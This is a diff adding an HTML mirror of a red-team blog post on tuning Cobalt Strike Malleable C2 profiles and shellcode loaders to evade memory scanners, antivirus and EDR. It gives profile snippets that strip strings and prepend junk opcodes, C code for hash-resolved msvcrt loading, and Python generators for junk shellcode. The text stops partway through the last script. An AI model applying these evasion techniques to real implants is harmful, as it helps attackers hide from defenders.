@@ -1,0 +1,360 @@
+# https://kleiton0x00.github.io/posts/Harnessing-the-Power-of-Cobalt-Strike-Profiles-for-EDR-Evasion/
+
+<!DOCTYPE html><html lang="en"><body data-spy="scroll" data-target="#toc"><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="https://kleiton0x00.github.io/"> Posts </a> </span> <span>Harnessing the Power of Cobalt Strike Profiles for EDR Evasion</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel">Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip="">Harnessing the Power of Cobalt Strike Profiles for EDR Evasion</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="" data-original-title="Tue, May 23, 2023, 12:00 AM +0200">May 22, 2023<i class="unloaded">2023-05-23T00:00:00+02:00</i></span> by <span class="author"> kleiton0x7e </span></div></div><div class="post-content"><p>Mirrored from <a href="https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/">WKL Security</a>. This version is an update ahead.</p><h2 id="introduction">Introduction</h2><p>In this blog post, we will go through the importance of each profile’s option, and explore the differences between default and customized Malleable C2 profiles used in the Cobalt Strike framework. In doing so, we demonstrate how the Malleable C2 profile lends versatility to Cobalt Strike. We will also take a step further by improving the existing open-source profiles to make Red-Team engagements more OPSEC-safe. All the scripts and the final profiles used for bypasses are published in our <a href="https://github.com/WKL-Sec/Malleable-CS-Profiles">Github repository</a>.</p><p>The article assumes that you are familiar with the fundamentals of flexible C2 and is meant to serve as a guide for developing and improving Malleable C2 profiles. The profile found <a href="https://github.com/xx0hcd/Malleable-C2-Profiles/blob/master/normal/amazon_events.profile">here</a> is used as a reference profile. Cobalt Strike 4.8 was used during the test cases and we are also going to use our <a href="https://github.com/WKL-Sec/GregsBestFriend/blob/main/Clang-LLVM/GregsBestFriend.cpp">project code</a> for the Shellcode injection.</p><p>The existing profiles are good enough to bypass most of the Antivirus products as well as EDR solutions; however, more improvements can be made in order to make it an OPSEC-safe profile and to bypass some of the most popular YARA rules.</p><h2 id="bypassing-memory-scanners">Bypassing memory scanners</h2><p>The recent versions of Cobalt Strike have made it so easy for the operators to bypass memory scanners like <a href="https://github.com/CCob/BeaconEye">BeaconEye</a> and <a href="https://github.com/thefLink/Hunt-Sleeping-Beacons">Hunt-Sleeping-Beacons</a>. The following option will make this bypass possible:</p><blockquote><p>set sleep_mask “true”;</p></blockquote><p>By enabling this option, Cobalt Strike will XOR the heap and every image section of its beacon prior to sleeping, leaving no string or data unprotected in the beacon’s memory. As a result, no detection is made by any of the mentioned tools.</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-05-16-15-26.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-05-16-15-26.png" alt="execution_of_hunt_sleeping_beacons" data-loaded="true"></p><p>BeaconEye also fails to find the malicious process with the sleeping Beacon:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-05-16-16-45.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-05-16-16-45.png" alt="execution_of_beaconeye" data-loaded="true"></p><p>While it bypassed the memory scanners, cross-referencing the memory regions, we find that it leads us straight to the beacon payload in memory.</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/memory_references1.jpg" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/memory_references1.jpg" alt="memory_references_to_shellcode" data-loaded="true"></p><p>This demonstrates that, since the beacon was where the API call originated, execution will return there once the <code class="language-plaintext highlighter-rouge">WaitForSingleObjectEx</code> function is finished. The reference to a memory address rather than an exported function is a red flag. Both automatic tooling and manual analysis can detect this.</p><p>It is highly recommended to enable “stack spoof” using the Artifact Kit in order to prevent such IOC. It is worthwhile to enable this option even though it is not a part of the malleable profile. The spoofing mechanism must be enabled by setting the fifth argument to true:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-07-14-42-47.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-07-14-42-47.png" alt="example_of_stack_spoofing_with_artifact_kit" data-loaded="true"></p><p>During the compilation, a .CNA file will be generated and that has to be imported in Cobalt Strike. Once imported, the changes are applied to the new generated payloads. Let’s analyze the Beacon again:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-07-15-06-49.jpg" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-07-15-06-49.jpg" alt="spoofed_thread_stacks" data-loaded="true"></p><p>The difference is very noticeable. The thread stacks are spoofed, leaving no trace of memory address references.</p><p>It should also be mentioned that Cobalt Strike added stack spoofing to the <a href="https://www.cobaltstrike.com/blog/arsenal-kit-update-thread-stack-spoofing/">arsenal kit in June 2021</a>. However, it was found that the call stack spoofing only applied to exe/dll artifacts created using the artifact kit, not to beacons injected via shellcode in an injected thread. They are therefore unlikely to be effective in obscuring the beacon in memory.</p><h2 id="bypassing-static-signatures">Bypassing static signatures</h2><p>It is time to test how well the beacon will perform against static signature scanners. Enabling the following feature will remove most of the strings stored in the beacon’s heap:</p><blockquote><p>set obfuscate “true”;</p></blockquote><p>Once the profile is applied to Cobalt Strike, generate a raw shellcode and put it in the Shellcode loader’s code. Once the EXE was compiled, we analyzed the differences in the stored strings:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-08-18-45-25-1024x636.jpg" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-08-18-45-25-1024x636.jpg" alt="string_differences_between_profile_and_raw_payload" data-loaded="true"></p><p>During many test cases we realized that the beacon still gets detected even if it is using heavy-customized profiles (including obfuscate). Using <a href="https://github.com/rasta-mouse/ThreatCheck">ThreadCheck</a> we realized that msvcrt string is being identified as “bad bytes”:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-06-01-36-33.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-06-01-36-33.png" alt="string_detection_example" data-loaded="true"></p><p>This string is found on both Beacon’s heap as well as the payload itself. The reason why <code class="language-plaintext highlighter-rouge">obfuscate</code> doesn’t remove this string is because <code class="language-plaintext highlighter-rouge">msvcrt.dll</code> is a dynamically-linked DLL:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-06-01-54-18.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-06-01-54-18.png" alt="malicious_strings_stored_in_beacons_heap" data-loaded="true"></p><p>The msvcrt.dll file is a part of the “Microsoft Visual Studio 6.0” and is crucial for most applications to work properly. It also contains program code that enables applications written in “Microsoft Visual C++” to run properly. Even though this DLL is a legit Windows DLL, Windows Defender consider it as malicious after a while. There are two ways (that I know) which can avoid the usage of <code class="language-plaintext highlighter-rouge">msvcrt.dll</code>, which will be described below.</p><h2 id="solution-1-make-the-payload-crt-library-independent">Solution 1: Make the payload CRT library independent</h2><p>This solution is nothing new, there are plenty of shellcode-loaders on both <a href="https://github.com/Cipher7/ApexLdr">Linux</a> and <a href="https://github.com/NUL0x4C/AtomLdr">Windows</a> who archives this. To make the code CRT library independent, you need to manually define a series of function pointer types:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="k">typedef</span> <span class="nf">__time64_t</span>  <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">_TIME64</span><span class="p">)</span>   <span class="p">(</span><span class="n">__time64_t</span> <span class="o">*</span><span class="n">_Time</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="nf">void</span>        <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">_SRAND</span><span class="p">)</span>   <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">seed</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="nf">int</span>         <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">_RAND</span><span class="p">)</span>    <span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="kt">void</span><span class="o">*</span>       <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">_MEMSET</span><span class="p">)</span>  <span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">str</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="nf">int</span>         <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">_PRINTF</span><span class="p">)</span>  <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...);</span>
+<span class="k">typedef</span> <span class="nf">int</span>         <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">_SPRINTF</span><span class="p">)</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...);</span>
+<span class="k">typedef</span> <span class="kt">void</span><span class="o">*</span>       <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">_MEMCPY</span><span class="p">)</span>  <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="nf">int</span>         <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">_MEMCMP</span><span class="p">)</span>  <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">str1</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">str2</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="nf">size_t</span>      <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">_STRLEN</span><span class="p">)</span>  <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">_Str</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="kt">void</span><span class="o">*</span>       <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">_REALLOC</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">_Memory</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">_NewSize</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="kt">void</span><span class="o">*</span>       <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">_MALLOC</span><span class="p">)</span>  <span class="p">(</span><span class="kt">size_t</span> <span class="n">_Size</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="kt">wchar_t</span><span class="o">*</span>    <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">_WCSCAT</span><span class="p">)</span>  <span class="p">(</span><span class="kt">wchar_t</span> <span class="o">*</span> <span class="n">__restrict__</span> <span class="n">_Dest</span><span class="p">,</span><span class="k">const</span> <span class="kt">wchar_t</span> <span class="o">*</span> <span class="n">__restrict__</span> <span class="n">_Source</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="nf">size_t</span>      <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">_WCSLEN</span><span class="p">)</span>  <span class="p">(</span><span class="k">const</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_Str</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></div></div><p>Lastly, the APIS structure organizes these function pointers into groups and includes a handle to a DLL.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre></td><td class="rouge-code"><pre><span class="k">typedef</span> <span class="k">struct</span> <span class="n">APIS</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">msvcrt</span> <span class="p">{</span>
+        <span class="n">WIN32_FUNC</span><span class="p">(</span><span class="n">_time64</span><span class="p">)</span>
+        <span class="n">WIN32_FUNC</span><span class="p">(</span><span class="n">srand</span><span class="p">)</span>
+        <span class="n">WIN32_FUNC</span><span class="p">(</span><span class="n">rand</span><span class="p">)</span>
+        <span class="n">WIN32_FUNC</span><span class="p">(</span><span class="n">memset</span><span class="p">)</span>
+        <span class="n">WIN32_FUNC</span><span class="p">(</span><span class="n">memcpy</span><span class="p">)</span>
+        <span class="n">WIN32_FUNC</span><span class="p">(</span><span class="n">memcmp</span><span class="p">)</span>
+        <span class="c1">//... define as many functions as you need from msvcrt.dll</span>
+        <span class="n">WIN32_FUNC</span><span class="p">(</span><span class="n">strlen</span><span class="p">)</span>
+        <span class="n">WIN32_FUNC</span><span class="p">(</span><span class="n">realloc</span><span class="p">)</span>
+        <span class="n">WIN32_FUNC</span><span class="p">(</span><span class="n">malloc</span><span class="p">)</span>
+        <span class="n">WIN32_FUNC</span><span class="p">(</span><span class="n">wcscat</span><span class="p">)</span>
+        <span class="n">WIN32_FUNC</span><span class="p">(</span><span class="n">wcslen</span><span class="p">)</span>
+        <span class="n">_PRINTF</span> <span class="n">printf</span><span class="p">;</span>
+        <span class="n">_SPRINTF</span> <span class="n">sprintf</span><span class="p">;</span>
+    <span class="p">}</span><span class="n">msvcrt</span><span class="p">;</span>
+
+    <span class="k">struct</span> <span class="n">handles</span> <span class="p">{</span>
+        <span class="n">HANDLE</span> <span class="n">mscvtdll</span><span class="p">;</span>
+    <span class="p">}</span><span class="n">handles</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">APIS</span><span class="p">,</span> <span class="o">*</span><span class="n">pAPIS</span><span class="p">;</span>
+
+<span class="k">extern</span> <span class="n">APIS</span> <span class="n">apis</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></div></div><p>The external declared variable <code class="language-plaintext highlighter-rouge">apis</code> of type <code class="language-plaintext highlighter-rouge">APIS</code> will allow access to the function pointers and handles organized in the APIS structure. This means we can now use the CRT functions like the example below:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="n">APIS</span> <span class="n">apis</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+<span class="n">CHAR</span> <span class="n">msvcrt_dll</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="sc">'m'</span><span class="p">,</span> <span class="sc">'s'</span><span class="p">,</span> <span class="sc">'v'</span><span class="p">,</span> <span class="sc">'c'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="sc">'t'</span><span class="p">,</span> <span class="sc">'.'</span><span class="p">,</span> <span class="sc">'d'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="sc">'l'</span><span class="p">,</span> <span class="mi">0</span><span class="p">};</span>
+<span class="n">apis</span><span class="p">.</span><span class="n">handles</span><span class="p">.</span><span class="n">mscvtdll</span> <span class="o">=</span> <span class="n">pLoadLibraryA</span><span class="p">(</span><span class="n">msvcrt_dll</span><span class="p">);</span>
+<span class="n">apis</span><span class="p">.</span><span class="n">msvcrt</span><span class="p">.</span><span class="n">memset</span> <span class="o">=</span> <span class="p">(</span><span class="n">_MEMSET</span><span class="p">)</span><span class="n">GetProcAddressH</span><span class="p">(</span><span class="n">apis</span><span class="p">.</span><span class="n">handles</span><span class="p">.</span><span class="n">mscvtdll</span><span class="p">,</span> <span class="n">HASH_memset</span><span class="p">);</span>
+
+<span class="n">apis</span><span class="p">.</span><span class="n">msvcrt</span><span class="p">.</span><span class="n">memset</span><span class="p">(</span><span class="n">pRandBuffer</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="n">sBufferSize</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></div></div><p>When using the <code class="language-plaintext highlighter-rouge">x86_64-w64-mingw32-gcc</code> compiler to prevent your application from dynamically linking to <code class="language-plaintext highlighter-rouge">msvcrt.dll</code>, you can append the <code class="language-plaintext highlighter-rouge">-static</code> flag. This flag directs the compiler to link against static versions of libraries. Additionally, the <code class="language-plaintext highlighter-rouge">-nostdlib</code> flag can be used to stop the compiler from linking the standard libraries and startup files, as the required msvcrt functions will be retrieved dynamically within the code. When using <code class="language-plaintext highlighter-rouge">-nostdlib</code>, it is necessary to manually link essential Windows system libraries by adding flags such as <code class="language-plaintext highlighter-rouge">-lkernel32</code> and <code class="language-plaintext highlighter-rouge">-luser32</code>.</p><p>More details can be found on <a href="https://github.com/Cipher7/ApexLdr">ApexLdr</a>.</p><h2 id="solution-2-clang-to-the-rescue">Solution 2: Clang++ to the rescue</h2><p>Different compilers have their own set of optimizations and flags that can be used to tailor the output for specific use cases. By experimenting with different compilers, users can achieve better performance and potentially bypass more AV/EDR systems.</p><p>For example, Clang++ provides several optimization flags that can help reduce the size of the compiled code, while GCC (G++) is known for its high-performance optimization capabilities. By using different compilers, users can achieve a unique executable that can evade detection:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-10-00-33-36.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-10-00-33-36.png" alt="mingw_vs_clangpp" data-loaded="true"></p><p>The string <strong>msvcrt.dll</strong> is not shown anymore, resulting in Windows Defender being bypassed:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-06-02-18-56.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-06-02-18-56.png" alt="no_suspicious_string" data-loaded="true"></p><p>Testing it against various Antivirus products leads to some promising results (bear in mind that an unencrypted shellcode was used):</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Pasted-image-20230507140514.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Pasted-image-20230507140514.png" alt="antiscan_results_raw_payload" data-loaded="true"></p><h2 id="removing-strings-is-never-enough">Removing strings is never enough</h2><p>Although having <code class="language-plaintext highlighter-rouge">obfuscate</code> enabled in our profile, we were still able to detect lots of strings inside the beacon’s stack:</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-09-01-56-03.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/Screenshot-from-2023-05-09-01-56-03.png" alt="beacon_stack_full_of_strings" data-loaded="true"></p><p>We modified the profile a little by adding the following options to remove all the mentioned strings:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre></td><td class="rouge-code"><pre>transform-x64 {
+    prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend nops
+    strrep "This program cannot be run in DOS mode" ""; # Remove this text
+    strrep "ReflectiveLoader" "";
+    strrep "beacon.x64.dll" "";
+    strrep "beacon.dll" ""; # Remove this text
+    strrep "msvcrt.dll" "";
+    strrep "C:\\Windows\\System32\\msvcrt.dll" "";
+    strrep "Stack around the variable" "";
+    strrep "was corrupted." "";
+    strrep "The variable" "";
+    strrep "is being used without being initialized." "";
+    strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
+    strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
+    strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
+    strrep "Stack memory was corrupted" "";
+    strrep "A local variable was used before it was initialized" "";
+    strrep "Stack memory around _alloca was corrupted" "";
+    strrep "Unknown Runtime Check Error" "";
+    strrep "Unknown Filename" "";
+    strrep "Unknown Module Name" "";
+    strrep "Run-Time Check Failure" "";
+    strrep "Stack corrupted near unknown variable" "";
+    strrep "Stack pointer corruption" "";
+    strrep "Cast to smaller type causing loss of data" "";
+    strrep "Stack memory corruption" "";
+    strrep "Local variable used before initialization" "";
+    strrep "Stack around" "corrupted";
+    strrep "operator" "";
+    strrep "operator co_await" "";
+    strrep "operator&lt;=&gt;" "";
+
+    }
+</pre></td></tr></tbody></table></code></div></div><h2 id="prepend-opcodes">Prepend OPCODES</h2><p>This option will append the opcodes you put in the profile in the beginning of the generated raw shellcode. So you must create a fully working shellcode in order not to crash the beacon when executed. Basically we have to create a junk assembly code that won’t affect the original shellcode. We can simply use a series of “0x90” (NOP) instructions, or even better, a dynamic combination of the following assembly instructions’ list. An easy example would be adding and subtracting a same value to different registers:</p><pre><code class="language-asm">inc esp
+dec esp
+inc ebx
+dec ebx
+inc eax
+dec eax
+dec rax
+inc rax
+nop
+xchg ax,ax
+nop dword ptr [eax]
+nop word ptr [eax+eax]
+nop dword ptr [eax+eax]
+nop dword ptr [eax]
+nop dword ptr [eax]
+</code></pre><p>Another set of junk instructions would be to write registers in the stack and restore them using <code class="language-plaintext highlighter-rouge">push</code> and <code class="language-plaintext highlighter-rouge">pop</code>:</p><pre><code class="language-asm">pushfq
+push rcx
+push rdx
+push r8
+push r9
+xor eax, eax
+xor eax, eax
+xor ebx, ebx
+xor eax, eax
+xor eax, eax
+pop r9
+pop r8
+pop rdx
+pop rcx
+popfq
+</code></pre><p>Pick a unique combination (by shuffling the instructions or by adding/removing them) and lastly, convert it to \x format to make it compatible with the profile. In this case, we took the instruction list as it is, so the final junky shellcode will look like the following when converted to the proper format:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>transform-x64 {
+        ...
+        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
+        ...
+}
+</pre></td></tr></tbody></table></code></div></div><p>We took this a step further by automating the whole process with a simple <a href="https://github.com/WKL-Sec/Malleable-CS-Profiles/blob/main/prepend.py">python script</a>. The code will generate a random junk shellcode that you can use on the prepend option:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">random</span>
+
+<span class="c1"># Define the byte strings to shuffle
+</span><span class="n">byte_strings</span> <span class="o">=</span> <span class="p">[</span><span class="s">"40"</span><span class="p">,</span> <span class="s">"41"</span><span class="p">,</span> <span class="s">"42"</span><span class="p">,</span> <span class="s">"6690"</span><span class="p">,</span> <span class="s">"40"</span><span class="p">,</span> <span class="s">"43"</span><span class="p">,</span> <span class="s">"44"</span><span class="p">,</span> <span class="s">"45"</span><span class="p">,</span> <span class="s">"46"</span><span class="p">,</span> <span class="s">"47"</span><span class="p">,</span> <span class="s">"48"</span><span class="p">,</span> <span class="s">"49"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"4c"</span><span class="p">,</span> <span class="s">"90"</span><span class="p">,</span> <span class="s">"0f1f00"</span><span class="p">,</span> <span class="s">"660f1f0400"</span><span class="p">,</span> <span class="s">"0f1f0400"</span><span class="p">,</span> <span class="s">"0f1f00"</span><span class="p">,</span> <span class="s">"0f1f00"</span><span class="p">,</span> <span class="s">"87db"</span><span class="p">,</span> <span class="s">"87c9"</span><span class="p">,</span> <span class="s">"87d2"</span><span class="p">,</span> <span class="s">"6687db"</span><span class="p">,</span> <span class="s">"6687c9"</span><span class="p">,</span> <span class="s">"6687d2"</span><span class="p">]</span>
+
+<span class="c1"># Shuffle the byte strings
+</span><span class="n">random</span><span class="p">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">byte_strings</span><span class="p">)</span>
+
+<span class="c1"># Create a new list to store the formatted bytes
+</span><span class="n">formatted_bytes</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="c1"># Loop through each byte string in the shuffled list
+</span><span class="k">for</span> <span class="n">byte_string</span> <span class="ow">in</span> <span class="n">byte_strings</span><span class="p">:</span>
+    <span class="c1"># Check if the byte string has more than 2 characters
+</span>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_string</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="c1"># Split the byte string into chunks of two characters
+</span>        <span class="n">byte_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">byte_string</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_string</span><span class="p">),</span> <span class="mi">2</span><span class="p">)]</span>
+        <span class="c1"># Add \x prefix to each byte and join them
+</span>        <span class="n">formatted_bytes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s">'</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="n">byte</span><span class="si">}</span><span class="s">'</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">byte_list</span><span class="p">]))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="c1"># Add \x prefix to the single byte
+</span>        <span class="n">formatted_bytes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="n">byte_string</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+        
+<span class="c1"># Join the formatted bytes into a single string
+</span><span class="n">formatted_string</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">formatted_bytes</span><span class="p">)</span>
+
+<span class="c1"># Print the formatted byte string
+</span><span class="k">print</span><span class="p">(</span><span class="n">formatted_string</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></div></div><p>When generating the raw shellcode again with the changed profile, you will notice the prepended bytes (all the bytes before MZ header):</p><p><img src="https://whiteknightlabs.com/wp-content/uploads/2023/05/image-4.png" data-src="https://whiteknightlabs.com/wp-content/uploads/2023/05/image-4.png" alt="mz_header_changed" data-loaded="true"></p><h2 id="the-millionaire-header">The “Millionaire” Header</h2><p>Adding the <code class="language-plaintext highlighter-rouge">rich_header</code> doesn’t make any difference in terms of evasion; however, it is still recommended to use it against Thread Hunters. This option is responsible for the meta-information inserted by the compiler. The Rich header is a PE section that serves as a fingerprint of a Windows’ executable’s build environment, and since it is a section that is not going to be executed, we can create a small <a href="https://github.com/WKL-Sec/Malleable-CS-Profiles/blob/main/rich_header.py">python script</a> to generate junk assembly code:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">random</span>
+
+<span class="k">def</span> <span class="nf">generate_junk_assembly</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">)])</span>
+
+<span class="k">def</span> <span class="nf">generate_rich_header</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
+    <span class="n">rich_header</span> <span class="o">=</span> <span class="n">generate_junk_assembly</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
